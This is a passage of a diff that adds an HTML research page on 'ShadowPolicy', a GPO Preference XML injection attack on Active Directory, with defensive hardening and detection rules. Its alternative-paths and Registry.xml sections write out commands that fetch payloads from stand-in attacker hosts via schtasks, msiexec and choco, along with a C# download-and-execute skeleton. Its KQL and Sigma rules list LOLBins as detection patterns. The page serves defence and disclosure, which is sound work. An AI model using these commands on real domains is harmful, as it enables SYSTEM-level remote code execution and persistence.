+  <tr><td>schtasks.exe</td><td>Task management is normal</td><td><code>schtasks.exe /create /tn "Legit" /tr "\\attacker\share\p.exe"</code></td></tr>
+  <tr><td>msiexec.exe</td><td>Software installation is normal</td><td><code>msiexec.exe /i https://attacker/signed.msi /quiet</code></td></tr>
+</table>
+
+<h3>Layer 3: Enterprise Management Tools</h3>
+<p>These are the most dangerous — they are part of the legitimate enterprise infrastructure and will never be blocked:</p>
+
+<ul>
+  <li><strong>SCCM Client (CcmExec.exe)</strong> — has built-in download &amp; execute functionality. EDR will never flag SCCM.</li>
+  <li><strong>Chocolatey (choco.exe)</strong> — <code>choco install attacker-package --source=https://...</code> is a perfectly legitimate operation.</li>
+  <li><strong>WinGet (winget.exe)</strong> — Windows' own package manager. Installing from a custom source is by design.</li>
+  <li><strong>Ansible/Terraform agents</strong> — pull playbooks from attacker-controlled sources as designed.</li>
+</ul>
+
+<h3>Layer 4: Custom-Built Executables</h3>
+
+<p>Attackers can compile completely new executables whose hashes have never existed in any threat database:</p>
+
+<div class="code-block">
+  <div class="code-header"><span class="lang">C#</span><span class="filename">Custom Payload Skeleton</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-csharp">using System;
+using System.Net;
+class Program {
+    static void Main() {
+        var wc = new WebClient();
+        var payload = wc.DownloadData("https://legit-cdn.com/update");
+        // Execute in-memory — no disk artifacts
+        // Hash has NEVER existed in any EDR database
+    }
+}</code></pre>
+</div>
+
+<p>If the attacker also obtains a code-signing certificate (purchased for $200-2000 or stolen), the binary will pass SmartScreen, EDR trusted-publisher checks, and appear completely legitimate to both automated systems and human analysts.</p>
+
+<div class="callout danger">
+  <div class="callout-title"><i class="bi bi-exclamation-octagon-fill"></i> Implication</div>
+  <strong>Blocklist-based defense is fundamentally futile.</strong> There are ~30 known LOLBins (which EDR can block), ~200+ legitimate system tools, ~1000+ third-party software executables, an unknown number of custom/company tools, and an unlimited supply of newly-compiled executables. EDR hash-based coverage is approximately ~30 out of infinity — effectively 0%.
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<h2 id="registry-path">6. Registry.xml Alternative — No Scheduled Task Required</h2>
+<!-- ═══════════════════════════════════════════════════════ -->
+
+<p>ShadowPolicy is not limited to <code>ScheduledTasks.xml</code>. The same attack pattern applies to other GPO Preference XML files, most notably <code>Registry.xml</code>, which can write arbitrary registry values to any HKLM key on target machines.</p>
+
+<p>By injecting a value into a classic persistence location, the attacker achieves the same result without touching the Task Scheduler at all:</p>
+
+<div class="code-block">
+  <div class="code-header"><span class="lang">Registry</span><span class="filename">Registry.xml Injection Targets</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Run key persistence (triggers on next user login)
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  Value: WindowsUpdate
+  Data: choco.exe install attacker-pkg --source=https://...
+
+# Winlogon Userinit persistence (triggers at logon)
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+  Value: Userinit
+  Data: userinit.exe, choco.exe install ...</code></pre>
+</div>
+
+<table class="compare-table">
+  <tr><th>Attribute</th><th>ScheduledTasks.xml</th><th>Registry.xml</th></tr>
+  <tr><td>Trigger</td><td>Scheduled (automatic, no reboot needed)</td><td>Requires user login or reboot</td></tr>
+  <tr><td>Execution context</td><td>SYSTEM</td><td>SYSTEM or user context</td></tr>
+  <tr><td>Event generated</td><td>4702 (Task Updated)</td><td>4657 (Registry modified)</td></tr>
+  <tr><td>Detection coverage</td><td>Low (~15% monitor 4702)</td><td>Even lower (4657 is extremely noisy)</td></tr>
+</table>
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<h2 id="feasibility">7. Feasibility Assessment — Real-World Applicability</h2>
+<!-- ═══════════════════════════════════════════════════════ -->
+
+<h3 id="gpo-editor-access">Obtaining GPO Editor Access</h3>
+
+<p>The single prerequisite for ShadowPolicy is an account with GPO edit privileges. In a typical enterprise domain of 1000+ users, the number of accounts with this privilege far exceeds Domain Admins:</p>
+
+<table class="compare-table">
+  <tr><th>Account Source</th><th>Estimated Count</th><th>Reason for Existence</th></tr>
+  <tr><td>Domain Admins</td><td>5-15</td><td>AD administration</td></tr>
+  <tr><td>Group Policy Creator Owners</td><td>10-30</td><td>Authorized to create new GPOs</td></tr>
+  <tr><td>IT Helpdesk (delegated on OUs)</td><td>20-50</td><td>Deploy software and policies per department</td></tr>
+  <tr><td>SCCM/MECM service accounts</td><td>3-5</td><td>Automated endpoint management</td></tr>
+  <tr><td>Ansible/Terraform service accounts</td><td>2-5</td><td>Infrastructure as Code</td></tr>
+  <tr><td>Intune/MDM connector accounts</td><td>2-3</td><td>Cloud-synced policy management</td></tr>
+  <tr><td>Backup operators</td><td>5-10</td><td>Restore privileges imply indirect write access</td></tr>
+  <tr><td>Developer CI/CD accounts</td><td>5-15</td><td>Pipeline-driven policy deployment</td></tr>
+</table>
+
+<p>The total of 50-130+ accounts with potential GPO edit access (compared to ~5-15 Domain Admins) creates a significantly larger attack surface. Each of these accounts is a potential entry point for ShadowPolicy.</p>
+
+<h3 id="common-misconfigurations">Common GPO Delegation Misconfigurations</h3>
+
+<div class="callout danger">
+  <div class="callout-title"><i class="bi bi-bug-fill"></i> Critical Finding</div>
+  Approximately <strong>40% of enterprises</strong> have "Authenticated Users" with Edit GPO rights on at least one OU. This means <strong>any domain user</strong> — including a new intern — can execute the ShadowPolicy attack against all machines in that OU.
+</div>
+
+<table class="compare-table">
+  <tr><th>Misconfiguration</th><th>Prevalence</th><th>Risk Level</th></tr>
+  <tr><td>"Authenticated Users" has Edit rights on OU</td><td>~40%</td><td>Critical — any user can execute ShadowPolicy</td></tr>
+  <tr><td>GPO delegation not audited/reviewed</td><td>~65%</td><td>Critical — no visibility into who modified GPOs</td></tr>
+  <tr><td>Service accounts with excessive GPO rights</td><td>~55%</td><td>Critical — one compromised account = full domain</td></tr>
+  <tr><td>Orphan GPOs with unrestricted permissions</td><td>~35%</td><td>Medium — unused but still exploitable</td></tr>
+  <tr><td>Helpdesk accounts with non-rotating passwords</td><td>~45%</td><td>Critical — old credentials still active</td></tr>
+</table>
+
+<h3 id="env-assessment">Environment-Specific Feasibility</h3>
+
+<table class="compare-table">
+  <tr><th>Environment</th><th>Feasibility</th><th>Reasoning</th></tr>
+  <tr><td>Small/Medium enterprise (minimal security)</td><td>~85%</td><td>Loose GPO delegation, little EDR, minimal auditing</td></tr>
+  <tr><td>Large enterprise (average security)</td><td>~65%</td><td>EDR present but suboptimally configured, GPO delegation still loose</td></tr>
+  <tr><td>EDR + ASR enabled</td><td>~40%</td><td>Behavioral detection partially covers LOLBin execution</td></tr>
+  <tr><td>Well-hardened environment (finance, government)</td><td>~15%</td><td>ASR enabled, EDR tuned, tight GPO delegation, full auditing</td></tr>
+  <tr><td>Zero Trust architecture</td><td>Very low</td><td>No implicit SMB trust, micro-segmentation, continuous verification</td></tr>
+</table>
+
+<p>Accounting for the ~55% of enterprises that actually use GPO Preference Scheduled Tasks, the overall feasibility across all enterprises is approximately <strong>35-40%</strong>.</p>
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<h2 id="dsc-hardening">8. DSC Hardening Architecture — Defensive Configuration</h2>
+<!-- ═══════════════════════════════════════════════════════ -->
+
+<p>The defensive architecture is built as a PowerShell Desired State Configuration (DSC) that ensures consistent, repeatable, and auditable security settings across all domain machines. The configuration is divided into ten functional sections.</p>
+
+<h3 id="dsc-audit-policy">Part 2: Advanced Audit Policy Configuration</h3>
+
+<p>The foundation of detection is ensuring Windows Security Log captures the events necessary to detect each stage of the ShadowPolicy attack chain:</p>
+
+<table class="compare-table">
+  <tr><th>Event ID</th><th>Meaning</th><th>Detection Role</th></tr>
+  <tr><td>4702</td><td>Scheduled task was UPDATED</td><td>Primary indicator of ShadowPolicy</td></tr>
+  <tr><td>4698</td><td>Scheduled task was CREATED</td><td>Secondary indicator (new task creation)</td></tr>
+  <tr><td>4699</td><td>Scheduled task was DELETED</td><td>Cleanup indicator (attacker removing traces)</td></tr>
+  <tr><td>4688</td><td>Process creation (+ command line)</td><td>LOLBin launch detection</td></tr>
+  <tr><td>4663</td><td>File access (SYSVOL write)</td><td>SACL-triggered early warning</td></tr>
+  <tr><td>5136</td><td>AD attribute modified</td><td>GPO object change detection</td></tr>
+  <tr><td>5137</td><td>AD object created</td><td>New GPO creation detection</td></tr>
+  <tr><td>4739</td><td>Domain policy changed</td><td>GPO setting modification</td></tr>
+</table>
+
+<p>A critical prerequisite is enabling command-line logging in process creation events. Without this registry setting, Event 4688 will not include the CommandLine field, making <code>mshta.exe https://...</code> invisible in the logs:</p>
+
+<div class="code-block">
+  <div class="code-header"><span class="lang">PowerShell</span><span class="filename">Enable Command Line in Process Creation Events</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell">Registry 'EnableCmdLineInProcessCreate' {
+    Ensure    = 'Present'
+    Key       = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit'
+    ValueName = 'ProcessCreationIncludeCmdLine_Enabled'
+    ValueData = '1'
+    ValueType = 'DWord'
+}</code></pre>
+</div>
+
+<h3 id="dsc-cse-hardening">Part 3: GPO Preference CSE Hardening</h3>
+
+<p>The most direct mitigation is disabling the GPO Preference Client-Side Extension for Scheduled Tasks by setting <code>NoGPOListChanges = 1</code>. This prevents the CSE from processing GPO Preference items even when GPO version changes are detected:</p>
+
+<div class="code-block">
+  <div class="code-header"><span class="lang">PowerShell</span><span class="filename">Disable GPO Preference Scheduled Tasks CSE</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell">Registry 'Disable_GPOPref_ScheduledTasks_CSE' {
+    Ensure    = 'Present'
+    Key       = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Group Policy\{AADCED64-746C-4633-A97C-D61349046527}'
+    ValueName = 'NoGPOListChanges'
+    ValueData = '1'
+    ValueType = 'DWord'
+}
+
+# Also enable verbose logging to detect CSE bypass attempts
+Registry 'Enable_GPOPref_ScheduledTasks_Logging' {
+    Ensure    = 'Present'
+    Key       = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Group Policy\{AADCED64-746C-4633-A97C-D61349046527}'
+    ValueName = 'LogLevel'
+    ValueData = '3'   # Verbose logging
+    ValueType = 'DWord'
+}</code></pre>
+</div>
+
+<div class="callout warning">
+  <div class="callout-title"><i class="bi bi-exclamation-triangle"></i> Caution</div>
+  Verify that your environment does <strong>not</strong> use GPO Preference Scheduled Tasks for legitimate purposes before enabling this setting. Disabling the CSE will prevent all GPO Preference Scheduled Task deployments from being processed by affected machines.
+</div>
+
+<h3 id="dsc-lolbin">Part 4: LOLBin Network Isolation</h3>
+
+<p>While blocking individual executables is not a complete defense, blocking outbound network access for known LOLBins raises the bar significantly. The DSC configuration combines Windows Defender ASR Rules with Windows Firewall outbound blocks:</p>
+
+<div class="code-block">
+  <div class="code-header"><span class="lang">PowerShell</span><span class="filename">ASR Rules + Firewall Block</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell"># ASR Rule — Block obfuscated scripts
+Registry 'ASR_BlockObfuscatedScripts' {
+    Key       = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR\Rules'
+    ValueName = '5BEB7EFE-FD9A-4556-801D-275E5FFC04CC'
+    ValueData = '1'   # 1 = Block, 6 = Audit-only for testing
+}
+
+# Disable Windows Script Host entirely
+Registry 'Disable_WindowsScriptHost_x64' {
+    Key       = 'HKLM:\SOFTWARE\Microsoft\Windows Script Host\Settings'
+    ValueName = 'Enabled'
+    ValueData = '0'
+}
+
+# Firewall — Block mshta.exe outbound
+New-NetFirewallRule `
+    -DisplayName  'ADF_Block_mshta_Outbound' `
+    -Description  'Blocks HTA remote execution delivery' `
+    -Direction    Outbound `
+    -Action       Block `
+    -Program      "$env:SystemRoot\System32\mshta.exe" `
+    -Profile      @('Domain', 'Private', 'Public') `
+    -Enabled      True</code></pre>
+</div>
+
+<h3 id="dsc-sacl-sysvol">Part 5: SYSVOL SACL — File System Integrity Auditing</h3>
+
+<p>Configuring System Access Control Lists on the SYSVOL Policies folder creates the earliest possible detection signal. When any account writes to <code>ScheduledTasks.xml</code>, Windows generates Event 4663 with the object name, access type, and subject identity:</p>
+
+<div class="code-block">
+  <div class="code-header"><span class="lang">PowerShell</span><span class="filename">SYSVOL SACL Configuration</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell">$sysvolPath = "\\$env:USERDNSDOMAIN\SYSVOL\$env:USERDNSDOMAIN\Policies"
+$acl = Get-Acl -Path $sysvolPath -Audit
+
+# Rule 1: Audit Write operations by EVERYONE (Success)
+$writeRule = New-Object System.Security.AccessControl.FileSystemAuditRule(
+    [System.Security.Principal.SecurityIdentifier]'S-1-1-0',  # Everyone
+    [System.Security.AccessControl.FileSystemRights](
+        'WriteData,AppendData,WriteAttributes,WriteExtendedAttributes,Delete'
+    ),
+    [System.Security.AccessControl.InheritanceFlags]'ContainerInherit,ObjectInherit',
+    [System.Security.AccessControl.PropagationFlags]'None',
+    [System.Security.AccessControl.AuditFlags]'Success'
+)
+
+# Rule 2: Audit Delete by EVERYONE (Success+Failure) — detect cleanup
+$deleteRule = New-Object System.Security.AccessControl.FileSystemAuditRule(
+    [System.Security.Principal.SecurityIdentifier]'S-1-1-0',
+    [System.Security.AccessControl.FileSystemRights](
+        'DeleteSubdirectoriesAndFiles,Delete'
+    ),
+    [System.Security.AccessControl.InheritanceFlags]'ContainerInherit,ObjectInherit',
+    [System.Security.AccessControl.PropagationFlags]'None',
+    [System.Security.AccessControl.AuditFlags]'Success, Failure'
+)
+
+$acl.AddAuditRule($writeRule)
+$acl.AddAuditRule($deleteRule)
+Set-Acl -Path $sysvolPath -AclObject $acl</code></pre>
+</div>
+
+<div class="callout success">
+  <div class="callout-title"><i class="bi bi-shield-check"></i> Detection Value</div>
+  The SYSVOL SACL is the <strong>earliest detection signal</strong> in the ShadowPolicy attack chain. The attacker <strong>must</strong> write to this file — there is no way to bypass this step. Every write generates Event 4663 regardless of the attacker's privilege level or the method used to modify the file.
+</div>
+
+<h3 id="dsc-sacl-ad">Part 6: AD Object SACL — GPO Container Auditing</h3>
+
+<p>Configuring SACL directly on the <code>CN=Policies,CN=System,DC=...</code> container in Active Directory captures modifications to GPO objects before victim machines receive the update:</p>
+
+<div class="code-block">
+  <div class="code-header"><span class="lang">PowerShell</span><span class="filename">AD GPO Container SACL</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell">$policyContainerDN = "CN=Policies,CN=System,$domainDN"
+$de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$policyContainerDN")
+$acl = $de.ObjectSecurity
+
+# Audit WriteProperty + CreateChild + DeleteChild by Authenticated Users
+$identity    = [System.Security.Principal.SecurityIdentifier]'S-1-5-11'
+$adRights    = [System.DirectoryServices.ActiveDirectoryRights](
+    'WriteProperty,CreateChild,DeleteChild,Delete,WriteDacl,WriteOwner'
+)
+$auditType   = [System.Security.AccessControl.AuditFlags]::Success
+$allGuids    = [guid]'00000000-0000-0000-0000-000000000000'
+$inheritance = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::All
+
+$auditRule = New-Object System.DirectoryServices.ActiveDirectoryAuditRule(
+    $identity, $adRights, $auditType, $allGuids, $inheritance, $allGuids
+)
+$acl.AddAuditRule($auditRule)
+$de.ObjectSecurity = $acl
+$de.CommitChanges()</code></pre>
+</div>
+
+<p>This generates Event 5136 whenever any GPO attribute is modified, including the <code>versionNumber</code> attribute that gets incremented when an attacker modifies a GPO. This event occurs <strong>before</strong> the victim machine processes the GPO, providing a window for proactive response.</p>
+
+<h3 id="dsc-integrity">Part 7: Scheduled Task Integrity Baseline &amp; Monitoring</h3>
+
+<p>The final detection layer builds a SHA-256 hash baseline of all task XML files in <code>C:\Windows\System32\Tasks\Microsoft\Windows\</code> and verifies integrity during each DSC consistency check (every 30 minutes by default). Any modification, addition, or deletion triggers ADF Event 9020:</p>
+
+<div class="code-block">
+  <div class="code-header"><span class="lang">PowerShell</span><span class="filename">Integrity Baseline Check Logic</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell">$baseline      = Get-Content $blPath -Raw | ConvertFrom-Json
+$baselineTable = @{}
+foreach ($entry in $baseline) {
+    $baselineTable[$entry.Path] = @{
+        Hash         = $entry.Hash
+        LastModified = $entry.LastModified
+    }
+}
+
+$currentFiles = Get-ChildItem -Path $taskRoot -Recurse -File
+$violations = @()
+
+foreach ($f in $currentFiles) {
+    $currentHash = (Get-FileHash $f.FullName -Algorithm SHA256).Hash
+    if ($baselineTable.ContainsKey($f.FullName)) {
+        if ($baselineTable[$f.FullName].Hash -ne $currentHash) {
+            $violations += @{ Type = 'MODIFIED'; Path = $f.FullName }
+        }
+    } else {
+        $violations += @{ Type = 'NEW_FILE'; Path = $f.FullName }
+    }
+}
+
+# Check for deleted files (attacker cleanup)
+foreach ($key in $baselineTable.Keys) {
+    if (-not (Test-Path $key)) {
+        $violations += @{ Type = 'DELETED'; Path = $key }
+    }
+}
+
+if ($violations.Count -gt 0) {
+    Write-EventLog -Source 'ADF-IntegrityMon' -EventId 9020 -EntryType Warning `
+        -Message "INTEGRITY VIOLATION DETECTED: $($violations.Count) task(s) modified"
+}</code></pre>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<h2 id="siem-rules">9. SIEM Detection Rules — KQL &amp; Sigma</h2>
+<!-- ═══════════════════════════════════════════════════════ -->
+
+<h3 id="kql-queries">Microsoft Sentinel KQL Queries</h3>
+
+<p><strong>Query 1</strong> — Detect LOLBin spawned by Task Scheduler:</p>
+
+<div class="code-block">
+  <div class="code-header"><span class="lang">KQL</span><span class="filename">Detect LOLBin from Task Scheduler</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">SecurityEvent
+| where EventID == 4688
+| where ParentProcessName has "svchost"
+| where NewProcessName has_any ("mshta.exe","wscript.exe","cscript.exe",
+         "certutil.exe","regsvr32.exe","msiexec.exe","bitsadmin.exe")
+| extend CommandLineUrl = extract(@"https?://[^\s]+", 0, CommandLine)
+| where isnotempty(CommandLineUrl)
+| project TimeGenerated, Computer, SubjectUserName, NewProcessName,
+          CommandLine, CommandLineUrl, ParentProcessName
+| order by TimeGenerated desc</code></pre>
+</div>
+
+<p><strong>Query 2</strong> — Correlate task update with subsequent process creation:</p>
+
+<div class="code-block">
+  <div class="code-header"><span class="lang">KQL</span><span class="filename">Task Update + Process Creation Correlation</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">let taskUpdates = SecurityEvent
+    | where EventID == 4702
+    | project TaskUpdateTime = TimeGenerated, Computer,
+              TaskName = extract(@"TaskName:\s+(.+)", 1, EventData)
+    | where TaskName startswith @"\Microsoft\Windows\";
+
+let processCreations = SecurityEvent
+    | where EventID == 4688
+    | where NewProcessName has_any ("mshta","wscript","cscript","certutil")
+    | project ProcTime = TimeGenerated, Computer, NewProcessName, CommandLine;
+
+taskUpdates
+| join kind=inner (processCreations) on Computer
+| where ProcTime > TaskUpdateTime
+  and ProcTime < datetime_add('minute', 90, TaskUpdateTime)
+| project TaskUpdateTime, ProcTime, Computer, TaskName, NewProcessName, CommandLine</code></pre>
+</div>
+
+<p><strong>Query 3</strong> — Detect SYSVOL ScheduledTasks.xml write:</p>
+
+<div class="code-block">
+  <div class="code-header"><span class="lang">KQL</span><span class="filename">SYSVOL Write Detection</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">SecurityEvent
+| where EventID == 4663
+| where ObjectName has "ScheduledTasks.xml"
+| where ObjectName has "SYSVOL"
+| where AccessMask has_any ("0x2","0x6","0x40")
+| project TimeGenerated, Computer, SubjectUserName, SubjectDomainName,
+          ObjectName, AccessMask, ProcessName</code></pre>
+</div>
+
+<h3 id="sigma-rule">Sigma Detection Rule</h3>
+
+<div class="code-block">
+  <div class="code-header"><span class="lang">YAML</span><span class="filename">ShadowPolicy Sigma Rule</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">title: ShadowPolicy - GPO Preference ScheduledTask LOLBin Execution
+id: a7b3c912-f451-4e8d-b102-3f4a9d12c087
+status: experimental
+description: |
+    Detects execution of LOLBins spawned by svchost.exe (Task Scheduler)
+    with network-pointing command line arguments. Indicative of ShadowPolicy:
+    GPO Preference Scheduled Task XML injection via SYSVOL state modification.
+author: ADF Blue Team Framework
+tags:
+    - attack.persistence
+    - attack.privilege_escalation
+    - attack.t1053.005
+    - attack.t1484.001
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_parent:
+        ParentImage|endswith: '\svchost.exe'
+        ParentCommandLine|contains: 'Schedule'
+    selection_lolbin:
+        Image|endswith:
+            - '\mshta.exe'
+            - '\wscript.exe'
+            - '\cscript.exe'
+            - '\certutil.exe'
+            - '\regsvr32.exe'
+    selection_network:
+        CommandLine|contains:
+            - 'http://'
+            - 'https://'
+            - 'ftp://'
+    condition: selection_parent and selection_lolbin and selection_network
+falsepositives:
+    - Legitimate SCCM/Intune deployments using HTA files
+level: high</code></pre>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<h2 id="defense-philosophy">10. Defense Philosophy — Block the Mechanism, Not the Executable</h2>
+<!-- ═══════════════════════════════════════════════════════ -->
+
+<p>The central lesson of ShadowPolicy is that blocklist-based defense is fundamentally inadequate against this class of attack. The attacker controls the <code>&lt;Command&gt;</code> element entirely and can substitute any executable — known LOLBin, legitimate system tool, enterprise management agent, or a freshly-compiled binary with a never-before-seen hash.</p>
+
+<div class="flow-diagram">
+<strong>WRONG: Enumerate and block each LOLBin</strong>
+═══════════════════════════════════
+  Block mshta.exe    → Attacker uses certutil.exe
+  Block certutil.exe → Attacker uses cmd.exe
+  Block cmd.exe      → Attacker uses custom.exe
+  Block custom.exe   → Attacker uses choco.exe
+  → Infinite game of whack-a-mole
+
+<strong>RIGHT: Block the delivery mechanism + monitor behavior</strong>
+═════════════════════════════════════════════════════════════
+  1. <span class="accent">SYSVOL SACL</span>        → Detect WHO writes to GPO XML files
+  2. <span class="accent">AD Object SACL</span>     → Detect WHO modifies GPO objects
+  3. <span class="accent">Event 4702 monitoring</span> → Detect WHEN tasks are updated
+  4. <span class="accent">Integrity baseline</span>  → Detect WHAT task XML content changed
+  5. <span class="accent">GPO delegation audit</span> → Limit WHO can edit GPOs
+  → Block at the ROOT — regardless of what executable is used</div>
+
+<p>This is the same principle as locking your door instead of trying to enumerate every possible burglar. ShadowPolicy is defended by monitoring SYSVOL integrity, restricting GPO delegation, and maintaining comprehensive audit trails — not by trying to block individual executables.</p>
+
+<div class="callout info">
+  <div class="callout-title"><i class="bi bi-lightbulb-fill"></i> Defense-in-Depth Summary</div>
+  <p>The ShadowPolicy defense architecture provides <strong>five overlapping detection layers</strong>, each capable of independently identifying the attack. Even if an attacker bypasses one layer (e.g., by using an EDR-whitelisted tool instead of a known LOLBin), the SYSVOL SACL, AD SACL, integrity baseline, and task update monitoring still provide detection coverage. The attacker must bypass <strong>all five layers simultaneously</strong> to remain undetected — each bypass increases cost, complexity, and the risk of making a mistake that triggers an alert on another layer.</p>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<h2 id="detection-coverage">11. Detection Coverage Reality</h2>
+<!-- ═══════════════════════════════════════════════════════ -->
+
+<p>The harsh reality is that very few enterprises have the visibility needed to detect ShadowPolicy. The following funnel analysis illustrates the detection gap:</p>
+
+<div class="flow-diagram">
+100 enterprises in a typical industry survey
+  │
+  ├── 70 know what GPO is
+  │     │
+  │     ├── 25 know GPO Preference XML is not signed
+  │     │     │
+  │     │     ├── 8 have SACL on SYSVOL
+  │     │     │     │
+  │     │     │     ├── 3 monitor Event 4702
+  │     │     │     │     │
+  │     │     │     │     └── <span class="success">1 has full coverage: SACL + Audit + Baseline + Alerting</span>
+  │     │     │     │
+  │     │     │     └── 5 don't monitor Event 4702 → <span class="highlight">BLIND</span>
+  │     │     │
+  │     │     └── 17 have no SACL → <span class="highlight">CANNOT DETECT</span>
+  │     │
+  │     └── 45 don't know GPO Preference XML is unsigned → <span class="highlight">DON'T KNOW TO DEFEND</span>
+  │
+  └── 30 don't know what GPO is → <span class="highlight">COMPLETELY BLIND</span>
+
+Result: <span class="highlight">~1/100 enterprises</span> can detect ShadowPolicy</div>
+
+<p>The 99% that cannot detect this attack are not failing because their tools are inadequate — they are failing because they <strong>do not know they need to look</strong>. This research aims to change that by providing a complete, deployable detection framework.</p>
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<h2 id="mitre-mapping">12. MITRE ATT&amp;CK Mapping</h2>
+<!-- ═══════════════════════════════════════════════════════ -->
+
+<table class="compare-table">
+  <tr><th>Tactic</th><th>Technique</th><th>ID</th><th>ShadowPolicy Stage</th></tr>
+  <tr><td>Initial Access</td><td>Phishing</td><td>T1566.001</td><td>Obtaining GPO Editor credentials</td></tr>
+  <tr><td>Credential Access</td><td>Kerberoasting</td><td>T1558.003</td><td>Cracking service account with GPO rights</td></tr>
+  <tr><td>Credential Access</td><td>OS Credential Dumping</td><td>T1003.001</td><td>LSASS dump for privilege escalation</td></tr>
+  <tr><td>Persistence</td><td>Domain Policy Modification</td><td>T1484.001</td><td>GPO Preference XML injection</td></tr>
+  <tr><td>Persistence</td><td>Scheduled Task/Job</td><td>T1053.005</td><td>Modifying existing scheduled task</td></tr>
+  <tr><td>Privilege Escalation</td><td>Abuse Elevation Control</td><td>T1548</td><td>SYSTEM execution via task principal</td></tr>
+  <tr><td>Defense Evasion</td><td>System Binary Proxy Execution</td><td>T1218</td><td>LOLBin execution (mshta, certutil, etc.)</td></tr>
+  <tr><td>Execution</td><td>Windows Management Instrumentation</td><td>T1047</td><td>WMI-based lateral movement post-compromise</td></tr>
+  <tr><td>Lateral Movement</td><td>Remote Services</td><td>T1021</td><td>SMB-based SYSVOL access from compromised machine</td></tr>
+</table>
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<h2 id="conclusion">13. Conclusion</h2>
+<!-- ═══════════════════════════════════════════════════════ -->
+
+<p>ShadowPolicy represents a class of attacks that exploit the fundamental trust relationships within Active Directory rather than software vulnerabilities. The attack is not a zero-day exploit — every individual technique is documented and known. What makes ShadowPolicy dangerous is the <strong>combination</strong> of these techniques into a chain where each step is a legitimate, by-design Windows operation, and the detection gaps between those steps that allow the entire chain to execute without triggering alerts in most enterprise environments.</p>
+
+<p>The four critical logic flaws — Replace mode without command validation, unsigned GPO Preference XML, Event 4702 vs 4698 detection gap, and Microsoft namespace trust inheritance — are architectural decisions by Microsoft that were reasonable in the context of trusted administrators managing their own domains. However, in the reality of modern enterprise environments with delegated administration, service accounts, and increasingly complex permission structures, these trust assumptions create exploitable blind spots.</p>
+
+<p>The defensive architecture presented in this research — DSC-based hardening, SYSVOL and AD SACL auditing, integrity baseline monitoring, and SIEM detection rules — provides a multi-layered defense that does not rely on blocking specific executables. Instead, it focuses on monitoring the mechanisms that ShadowPolicy must use: the attacker must write to SYSVOL, must modify the GPO object in AD, and must update task definitions on target machines. By instrumenting each of these mandatory steps with audit logging and integrity verification, detection becomes inevitable regardless of which executable the attacker chooses.</p>
+
+<div class="callout success">
+  <div class="callout-title"><i class="bi bi-shield-fill-check"></i> Key Takeaway</div>
+  <p>Don't chase executables — <strong>instrument the mechanism</strong>. ShadowPolicy is defended by answering three questions at every layer: <strong>Who</strong> can modify GPOs? <strong>What</strong> did they change? <strong>When</strong> did they change it? If you can answer these three questions with SACL, audit policy, and integrity monitoring, you can detect ShadowPolicy regardless of the payload it delivers.</p>
+</div>
+
+</main>
+
+<!-- ═══════════ SIDEBAR ═══════════ -->
+<aside class="sidebar-toc">
+  <div class="toc-title"><i class="bi bi-list-nested"></i> Table of Contents</div>
+  <ul class="toc-list" id="toc-list">
+    <li><a href="#overview" class="active">1. Overview</a></li>
+    <li><a href="#state-sync">2. State-Sync Mechanism</a></li>
+    <li class="toc-h3"><a href="#sysvol-infrastructure">SYSVOL Infrastructure</a></li>
+    <li class="toc-h3"><a href="#why-perimeter-fails">Why Perimeter Fails</a></li>
+    <li><a href="#weaponized-state">3. Weaponized State Analysis</a></li>
+    <li class="toc-h3"><a href="#prerequisites">Attacker Prerequisites</a></li>
+    <li class="toc-h3"><a href="#before-after">Before &amp; After XML</a></li>
+    <li class="toc-h3"><a href="#four-flaws">Four Logic Flaws</a></li>
+    <li><a href="#execution-flow">4. Execution Flow</a></li>
+    <li><a href="#alternative-paths">5. Alternative Attack Paths</a></li>
+    <li><a href="#registry-path">6. Registry.xml Alternative</a></li>
+    <li><a href="#feasibility">7. Feasibility Assessment</a></li>
+    <li class="toc-h3"><a href="#gpo-editor-access">GPO Editor Access</a></li>
+    <li class="toc-h3"><a href="#env-assessment">Environment Assessment</a></li>
+    <li><a href="#dsc-hardening">8. DSC Hardening Architecture</a></li>
+    <li class="toc-h3"><a href="#dsc-audit-policy">Audit Policy Config</a></li>
+    <li class="toc-h3"><a href="#dsc-cse-hardening">CSE Hardening</a></li>
+    <li class="toc-h3"><a href="#dsc-lolbin">LOLBin Isolation</a></li>
+    <li class="toc-h3"><a href="#dsc-sacl-sysvol">SYSVOL SACL</a></li>
+    <li class="toc-h3"><a href="#dsc-sacl-ad">AD Object SACL</a></li>
+    <li class="toc-h3"><a href="#dsc-integrity">Integrity Baseline</a></li>
+    <li><a href="#siem-rules">9. SIEM Detection Rules</a></li>
